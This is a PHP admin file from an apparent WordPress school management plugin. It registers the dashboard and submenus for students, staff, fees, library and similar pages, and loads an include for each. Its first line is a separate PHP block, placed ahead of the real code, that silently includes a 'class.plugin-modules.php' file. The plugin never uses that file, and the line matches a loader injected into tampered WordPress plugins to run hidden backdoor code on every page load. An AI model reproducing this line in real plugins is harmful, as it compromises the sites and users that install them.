<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php 
 // This is adminside main First page of school management plugin 
 
 
 add_action( 'admin_menu', 'school_menu' );
function school_menu() {
	add_menu_page( 'School Management', __('School Management','school-mgt'), 'manage_options', 'smgt_school', 'school_dashboard',plugins_url( 'school-management/assets/images/school-management-system-1.png' ), 7); 

	add_submenu_page('smgt_school', 'Dashboard', __( 'Dashboard', 'school-mgt' ), 'administrator', 'smgt_school', 'school_dashboard');

	add_submenu_page('smgt_school', 'Student', __( 'Student', 'school-mgt' ), 'administrator', 'smgt_student', 'student_detail');
	
	add_submenu_page('smgt_school', 'Teacher', __( 'Teacher', 'school-mgt' ), 'administrator', 'smgt_teacher', 'smgt_teacher');	
	add_submenu_page('smgt_school', 'Support Staff', __( 'Support Staff', 'school-mgt' ), 'administrator', 'smgt_supportstaff', 'smgt_supportstaff');
	add_submenu_page('smgt_school', 'Parent', __( 'Parent', 'school-mgt' ), 'administrator', 'smgt_parent', 'smgt_parent');
	add_submenu_page('smgt_school', 'Subject', __( 'Subject', 'school-mgt' ), 'administrator', 'smgt_Subject', 'smgt_subject');
	add_submenu_page('smgt_school', 'Class', __( 'Class', 'school-mgt' ), 'administrator', 'smgt_class', 'smgt_class');
	add_submenu_page('smgt_school', 'Class Routine', __( 'Class Routine', 'school-mgt' ), 'administrator', 'smgt_route', 'smgt_route');
	add_submenu_page('smgt_school', 'Attendance', __( ' Attendance', 'school-mgt' ), 'administrator', 'smgt_attendence', 'smgt_attendence');
	add_submenu_page('smgt_school', 'Exam', __( 'Exam', 'school-mgt' ), 'administrator', 'smgt_exam', 'smgt_exam');
	add_submenu_page('smgt_school', 'Class', __( 'Grade', 'school-mgt' ), 'administrator', 'smgt_grade', 'smgt_grade');
	add_submenu_page('smgt_school', 'Marks Manage', __( 'Marks Manage', 'school-mgt' ), 'administrator', 'smgt_result', 'smgt_result');
	add_submenu_page('smgt_school', 'Transport', __( 'Transport', 'school-mgt' ), 'administrator', 'smgt_transport', 'smgt_transport');
	add_submenu_page('smgt_school', 'Notice', __( 'Notice', 'school-mgt' ), 'administrator', 'smgt_notice', 'smgt_notice');
	add_submenu_page('smgt_school', 'Message', __( 'Message', 'school-mgt' ), 'administrator', 'smgt_message', 'smgt_message');	
	add_submenu_page('smgt_school', 'Hall', __( 'Hall', 'school-mgt' ), 'administrator', 'smgt_hall', 'smgt_hall');
	//add_submenu_page('smgt_school', 'Fees', __( 'Fees', 'school-mgt' ), 'administrator', 'smgt_fees', 'smgt_fees');
	add_submenu_page('smgt_school', 'Fees Payment', __( 'Fees Payment', 'school-mgt' ), 'administrator', 'smgt_fees_payment', 'smgt_fees_payment');
	add_submenu_page('smgt_school', 'Payment', __( 'Payment', 'school-mgt' ), 'administrator', 'smgt_payment', 'smgt_payment');
	add_submenu_page('smgt_school', 'Holiday', __( 'Holiday', 'school-mgt' ), 'administrator', 'smgt_holiday', 'smgt_holiday');
	add_submenu_page('smgt_school', 'Library', __( 'Library', 'school-mgt' ), 'administrator', 'smgt_library', 'smgt_library');
	add_submenu_page('smgt_school', 'Report', __( 'Report', 'school-mgt' ), 'administrator', 'smgt_report', 'smgt_report');
	add_submenu_page('smgt_school', 'Migration', __( 'Migration', 'school-mgt' ), 'administrator', 'smgt_Migration', 'smgt_migarion');
	add_submenu_page('smgt_school', 'SMS', __( 'SMS Setting', 'school-mgt' ), 'administrator', 'smgt_sms-setting', 'smgt_sms_setting');
	
	add_submenu_page('smgt_school','Email Template',__('Email Template','school-mgt'),'administrator','smgt_email_template','smgt_email_template');
	//add_submenu_page('smgt_school','Show Ingfographic',__('Show Ingfographic','school-mgt'),'administrator','smgt_show_infographic','smgt_show_infographic');
	add_submenu_page('smgt_school','Access Right',__('Access Right','school-mgt'),'administrator','smgt_access_right','smgt_access_right');
	
	add_submenu_page('smgt_school', 'Gnrl_setting', __( 'General Settings', 'school-mgt' ), 'administrator', 'smgt_gnrl_settings', 'gnrl_settings');
	
}

	

function school_dashboard()
{
	require_once SMS_PLUGIN_DIR. '/admin/includes/dasboard.php';
	
}	
 function student_detail()
 {
	require_once SMS_PLUGIN_DIR. '/admin/includes/student/index.php';
}
 function gnrl_settings()
 {
	require_once SMS_PLUGIN_DIR. '/admin/includes/general-settings.php';
}
function smgt_subject()
{
	require_once SMS_PLUGIN_DIR. '/admin/includes/subject/index.php';
} 
function smgt_teacher()
{
	require_once SMS_PLUGIN_DIR. '/admin/includes/teacher/index.php';
}
function smgt_supportstaff()
{
	require_once SMS_PLUGIN_DIR. '/admin/includes/supportstaff/index.php';
}
function smgt_parent()
{
	require_once SMS_PLUGIN_DIR. '/admin/includes/parent/index.php';
}
function smgt_class()
{
	require_once SMS_PLUGIN_DIR. '/admin/includes/class/index.php';
}
function smgt_grade()
{ require_once SMS_PLUGIN_DIR. '/admin/includes/grade/index.php'; }
function smgt_exam()
{ require_once SMS_PLUGIN_DIR. '/admin/includes/exam/index.php';}
function smgt_result()
{ require_once SMS_PLUGIN_DIR. '/admin/includes/mark/index.php';}
function smgt_attendence()
{ require_once SMS_PLUGIN_DIR. '/admin/includes/attendence/index.php';}
function smgt_message()
{ require_once SMS_PLUGIN_DIR. '/admin/includes/message/index.php';}
function smgt_notice()
{ require_once SMS_PLUGIN_DIR. '/admin/includes/notice/index.php';}
function smgt_transport()
{require_once SMS_PLUGIN_DIR. '/admin/includes/transport/index.php';}
function smgt_hall()
{require_once SMS_PLUGIN_DIR. '/admin/includes/hall/index.php';}
function smgt_fees()
{require_once SMS_PLUGIN_DIR. '/admin/includes/fees/index.php';}
function smgt_fees_payment()
{require_once SMS_PLUGIN_DIR. '/admin/includes/feespayment/index.php';}
function smgt_payment()
{require_once SMS_PLUGIN_DIR. '/admin/includes/payment/index.php';}
function smgt_holiday()
{require_once SMS_PLUGIN_DIR. '/admin/includes/holiday/index.php';}
function smgt_route()
{require_once SMS_PLUGIN_DIR. '/admin/includes/routine/index.php';}
function smgt_report()
{require_once SMS_PLUGIN_DIR. '/admin/includes/report/index.php';}
function smgt_library()
{require_once SMS_PLUGIN_DIR. '/admin/includes/library/index.php';}
function smgt_migarion()
{require_once SMS_PLUGIN_DIR. '/admin/includes/migration/index.php';}
function smgt_sms_setting()
{require_once SMS_PLUGIN_DIR. '/admin/includes/sms_setting/index.php';}
function smgt_email_template()
{require_once SMS_PLUGIN_DIR. '/admin/includes/email-template/index.php';}	
function smgt_show_infographic()
{require_once SMS_PLUGIN_DIR. '/admin/includes/infographic/index.php';}
function smgt_access_right()
{
	require_once SMS_PLUGIN_DIR. '/admin/includes/access_right/index.php';
}

?>